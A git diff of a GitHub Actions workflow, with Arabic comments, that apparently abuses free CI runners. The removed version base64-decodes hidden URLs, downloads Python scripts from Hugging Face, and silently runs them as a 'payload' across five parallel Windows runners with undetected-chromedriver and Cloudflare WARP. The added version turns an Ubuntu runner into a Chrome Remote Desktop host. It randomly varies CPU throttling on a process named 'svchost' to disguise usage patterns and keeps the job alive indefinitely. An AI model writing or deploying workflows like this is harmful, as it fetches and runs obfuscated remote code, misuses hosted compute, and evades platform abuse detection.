@@ -1,78 +1,90 @@
-name: Background Task nkrg
+name: Ultimate-1D-Counter-Linux
 
-on:
-  workflow_dispatch: # للتشغيل اليدوي
+on: 
+  workflow_dispatch:
+
 jobs:
-  execute-nodes:
-    name: Worker-Instance [${{ matrix.node_index }}]
-    runs-on: windows-2022
-    timeout-minutes: 185 # الحد الأقصى للتشغيل (لتجنب الإيقاف المفاجئ من GitHub)
-    
-    strategy:
-      fail-fast: false
-      matrix:
-        node_index: [1, 2, 3, 4 ,5] # تشغيل عدة نسخ في نفس الوقت
-
+  build:
+    runs-on: ubuntu-latest
     steps:
-      # ---------------------------------------------------------
-      # الخطوة الأولى: تهيئة البيئة وتنزيل الملفات
-      # ---------------------------------------------------------
-      - name: Environment Setup & Script Download
-        shell: bash
-        run: |
-          echo ">>> [SYSTEM] Starting Node-${{ matrix.node_index }} setup..."
-          
-          # فك تشفير الروابط وتحميلها في المتغيرات
-          URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
-          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmdyaWsvcmVzb2x2ZS9tYWluL3N0YXJ0X2Rvd24ucHk=" | base64 --decode)          
-          # حفظ الملفات (سيتم حفظ الملف الأساسي باسم start.py لتسهيل التشغيل)
-          curl -sL "$URL_HASH" > hash.py
-          curl -sL "$URL_MAIN" > start.py
-          
-          echo ">>> [SYSTEM] Installing Python modules..."
-          python -m pip install -qU pip setuptools
-          pip install -q undetected-chromedriver selenium requests
-          echo ">>> [SYSTEM] Ready to execute."
 
-      # ---------------------------------------------------------
-      # الخطوة الثانية: التشغيل الصامت مع نظام الحماية الزمني
-      # ---------------------------------------------------------
-      - name: Launch Payload & Time Monitor
-        shell: pwsh
+      # -----------------------------------------------------------
+      # خطوة 1: تثبيت أدوات التحكم بالمعالج (cpulimit)
+      # -----------------------------------------------------------
+      - name: Install System Control Tools
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y cpulimit
+
+      # -----------------------------------------------------------
+      # خطوة 2: تثبيت Chrome و Chrome Remote Desktop
+      # -----------------------------------------------------------
+      - name: Install Chrome & CRD
+        run: |
+          echo "⬇️ Downloading & Installing Chrome & CRD..."
+          sudo apt-get install -y wget curl xvfb dbus-x11 xfce4 xfce4-terminal
+
+          # تثبيت Google Chrome
+          wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+          sudo apt-get install -y ./google-chrome-stable_current_amd64.deb
+          rm google-chrome-stable_current_amd64.deb
+
+          # تثبيت Chrome Remote Desktop
+          wget -q https://dl.google.com/linux/direct/chrome-remote-desktop_current_amd64.deb
+          sudo apt-get install -y ./chrome-remote-desktop_current_amd64.deb
+          rm chrome-remote-desktop_current_amd64.deb
+
+      # -----------------------------------------------------------
+      # خطوة 3: تشغيل Chrome Remote Desktop
+      # -----------------------------------------------------------
+      - name: Start Chrome Remote Desktop
         env:
-          PYTHONIOENCODING: "utf-8"
+          CRD_CODE: ${{ secrets.CRD_CODE }}
+          CRD_PIN: ${{ secrets.CRD_PIN }}
         run: |
-          Write-Output "[INFO] Initiating start.py on Instance ${{ matrix.node_index }}..."
-          
-          # إضافة WARP لمسار النظام بطريقة مباشرة
-          $env:PATH = $env:PATH + ";C:\Program Files\Cloudflare\Cloudflare WARP"
-          
-          # تجهيز معطيات تشغيل العملية في الخلفية
-          $ProcessArgs = @{
-              FilePath     = "python"
-              ArgumentList = "start.py"
-              PassThru     = $true
-              NoNewWindow  = $true
-          }
-          $activeProcess = Start-Process @ProcessArgs
-          
-          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 180 mins."
-          
-          try {
-              # انتظار انتهاء العملية أو وصولها للحد الزمني (10800 ثانية = 3 ساعات)
-              Wait-Process -InputObject $activeProcess -Timeout 10800 -ErrorAction Stop
-              Write-Output "[SUCCESS] Task completed within limits."
-          } 
-          catch {
-              # إيقاف إجباري عند تخطي الوقت
-              Write-Output "[TIMEOUT] Maximum time reached. Forcing process kill..."
-              Stop-Process -InputObject $activeProcess -Force
-              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 3 hours."
-          }
+          UniqueName="${{ github.actor }}-Machine-${{ env.DEVICE_NUM }}"
+          echo "🚀 STARTING RDP SERVICE: $UniqueName"
 
-      # ---------------------------------------------------------
-      # الخطوة الثالثة: إغلاق المهمة
-      # ---------------------------------------------------------
-      - name: Finalize
-        shell: bash
-        run: echo "<<< [SYSTEM] Worker-${{ matrix.node_index }} finished its lifecycle."
+          # إعداد مجلد الإعدادات لخدمة CRD
+          sudo mkdir -p /etc/chrome-remote-desktop
+          sudo chown -R runner:runner /etc/chrome-remote-desktop
+
+          # ربط وإطلاق خدمة Chrome Remote Desktop
+          DISPLAY= /opt/google/chrome-remote-desktop/start-host \
+            --code="$CRD_CODE" \
+            --redirect-url="https://remotedesktop.google.com/_/oauthredirect" \
+            --name="$UniqueName" \
+            --pin="$CRD_PIN" &
+
+      # -----------------------------------------------------------
+      # خطوة 4: تفعيل التقييد المذبذب المباشر (15% - 18%)
+      # -----------------------------------------------------------
+      - name: Dynamic CPU Limiter (15% - 18%)
+        run: |
+          echo "⚙️ Activating Dynamic Hardware Throttle Engine..."
+          
+          # استبدل svchost باسم الملف التنفيذي المستهدف لديك إذا اختلف
+          TARGET_EXE="svchost"
+          
+          # سكربت خلفي يتغير كل فترة لكسر نمط الاستهلاك القياسي
+          (
+            while true; do
+              # اختيار نسبة عشوائية بين 15% و 18%
+              LIMIT=$((15 + RANDOM % 4))
+              
+              # تطبيق التقييد المباشر على اسم العملية وقمع المخرجات
+              sudo cpulimit -e "$TARGET_EXE" -l "$LIMIT" -b >/dev/null 2>&1 || true
+              
+              # الانتظار لمدة عشوائية بين 20 إلى 45 ثانية قبل تغيير النسبة مجدداً
+              SLEEP_TIME=$((20 + RANDOM % 26))
+              sleep $SLEEP_TIME
+            done
+          ) &
+
+      # -----------------------------------------------------------
+      # خطوة 5: البقاء (Keep Alive)
+      # -----------------------------------------------------------
+      - name: Keep Alive
+        run: |
+          echo "✅ Runner active and CPU throttle engaged."
+          while true; do sleep 300; done
